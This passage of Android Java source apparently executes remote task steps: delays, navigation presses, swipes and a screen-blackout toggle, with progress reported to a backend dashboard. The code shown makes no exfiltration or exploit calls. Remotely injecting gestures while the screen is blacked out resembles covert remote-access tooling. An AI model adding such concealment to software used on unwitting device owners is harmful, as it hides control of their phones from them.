                    }

                    // ── Delay ────────────────────────────────────────────────
                    case "delay": {
                        int ms = step.optInt("ms", 1000);
                        Thread.sleep(ms);
                        result = new JSONObject().put("success", true).put("message", "Waited " + ms + " ms");
                        break;
                    }

                    // ── Navigation ───────────────────────────────────────────
                    case "press_home":    result = dispatchCommand("press_home",    new JSONObject()); break;
                    case "press_back":    result = dispatchCommand("press_back",    new JSONObject()); break;
                    case "press_recents": result = dispatchCommand("press_recents", new JSONObject()); break;

                    // ── Screen Block ─────────────────────────────────────────
                    case "block_screen":   result = dispatchCommand("screen_blackout_on",  new JSONObject()); break;
                    case "unblock_screen": result = dispatchCommand("screen_blackout_off", new JSONObject()); break;

                    // ── Swipes ───────────────────────────────────────────────
                    case "swipe_up":    { JSONObject p = new JSONObject(); p.put("direction", "up");    result = dispatchCommand("swipe", p); break; }
                    case "swipe_down":  { JSONObject p = new JSONObject(); p.put("direction", "down");  result = dispatchCommand("swipe", p); break; }
                    case "swipe_left":  { JSONObject p = new JSONObject(); p.put("direction", "left");  result = dispatchCommand("swipe", p); break; }
                    case "swipe_right": { JSONObject p = new JSONObject(); p.put("direction", "right"); result = dispatchCommand("swipe", p); break; }

                    default:
                        result = new JSONObject()
                                .put("success", false)
                                .put("error", "Unknown step type: " + type);
                }

                boolean ok     = result.optBoolean("success", false);
                String  errMsg = ok ? null : result.optString("error", "Step failed");
                String  msg    = ok ? ("Done: " + type) : ("Failed: " + errMsg);

                // Report step result
                sendTaskProgress(commandId, i, total, true, ok, msg, false, errMsg);

                if (ok) {
                    completed++;
                } else {
                    // A step failed — stop the task immediately
                    Log.w(TAG, "executeTaskLocal: step " + i + " (" + type + ") failed — aborting task. Reason: " + errMsg);
                    sendTaskCompleteEvent(commandId, completed, total);
                    return;
                }

                // Settle delay between steps (skip after last step)
                if (i < total - 1) Thread.sleep(INTER_STEP_DELAY_MS);

            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
                sendTaskProgress(commandId, i, total, true, false, "Task interrupted", false, "interrupted");
                sendTaskCompleteEvent(commandId, completed, total);
                return;
            } catch (Exception e) {
                Log.e(TAG, "executeTaskLocal step " + i + " exception: " + e.getMessage());
                sendTaskProgress(commandId, i, total, true, false, "Error: " + e.getMessage(), false, e.getMessage());
                sendTaskCompleteEvent(commandId, completed, total);
                return;
            }
        }

        // All steps completed
        sendTaskCompleteEvent(commandId, completed, total);
    }

    /** Send the final task:progress completion event. */
    private void sendTaskCompleteEvent(String commandId, int completed, int total) {
        try {
            JSONObject prog = new JSONObject();
            prog.put("commandId", commandId);
            prog.put("complete",  true);
            prog.put("completed", completed);
            prog.put("total",     total);
            sendMessage("task:progress", prog);
        } catch (Exception e) {
            Log.e(TAG, "sendTaskCompleteEvent error: " + e.getMessage());
        }
    }

    /** Send a task:progress event to the backend for forwarding to the dashboard. */
    private void sendTaskProgress(String commandId, int stepIndex, int total, boolean done,
                                   boolean success, String message, boolean complete, String error) {
        try {
            JSONObject prog = new JSONObject();
            prog.put("commandId", commandId);
            prog.put("stepIndex", stepIndex);
            prog.put("stepTotal", total);
            prog.put("done", done);
            prog.put("success", success);
            prog.put("message", message);
            prog.put("complete", complete);
            if (error != null) prog.put("error", error);
            sendMessage("task:progress", prog);
        } catch (Exception e) {
            Log.e(TAG, "sendTaskProgress error: " + e.getMessage());
        }
    }
}
